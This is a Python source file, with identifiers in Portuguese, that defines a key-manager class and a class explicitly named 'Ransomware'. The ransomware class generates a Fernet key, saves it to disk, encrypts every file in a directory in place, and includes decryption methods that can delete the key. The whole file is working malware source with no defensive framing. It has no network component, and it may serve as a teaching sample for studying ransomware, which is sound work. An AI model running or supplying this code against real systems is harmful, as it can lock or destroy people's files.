import os

from cryptography.fernet import Fernet

from arquivos_utils import escrever_arquivo, ler_arquivo


class GerenciadorDeChave:
    def __init__(self, caminho_para_chave):
        self.caminho_para_chave = caminho_para_chave

    def crie_chave(self):
        chave_criptografia = Fernet.generate_key()
        escrever_arquivo(self.caminho_para_chave, chave_criptografia)
        return chave_criptografia

    def obtenha_chave(self, legivel=False):
        chave = ler_arquivo(self.caminho_para_chave)

        if legivel:
            return chave.decode('utf-8')

        return chave

    def remova_chave(self):
        os.remove(self.caminho_para_chave)

    @staticmethod
    def converta_para_bytes(chave):
        return chave.encode('utf-8')


class Ransomware:
    def __init__(self, gerenciador_de_chave):
        self.gerenciador_de_chave = gerenciador_de_chave
        self.fernet = Fernet(self.gerenciador_de_chave.crie_chave())

    def infecte_arquivo(self, caminho_para_arquivo):
        conteudo = ler_arquivo(caminho_para_arquivo)
        conteudo_criptografado = self.fernet.encrypt(conteudo)
        escrever_arquivo(caminho_para_arquivo, conteudo_criptografado)

    def infecte_diretorio(self, diretorio):
        for nome_arquivo in os.listdir(diretorio):
            caminho_arquivo = f'{diretorio}/{nome_arquivo}'
            self.infecte_arquivo(caminho_arquivo)

    def desinfecte_arquivo(self, caminho_para_arquivo, remover_chave=False):
        conteudo_criptografado = ler_arquivo(caminho_para_arquivo)
        conteudo = self.fernet.decrypt(conteudo_criptografado)
        escrever_arquivo(caminho_para_arquivo, conteudo)

        if remover_chave:
            self.gerenciador_de_chave.remova_chave()

    def desinfecte_diretorio(self, diretorio, remover_chave=False):
        for nome_arquivo in os.listdir(diretorio):
            caminho_arquivo = f'{diretorio}/{nome_arquivo}'
            self.desinfecte_arquivo(caminho_arquivo)

        if remover_chave:
            self.gerenciador_de_chave.remova_chave()
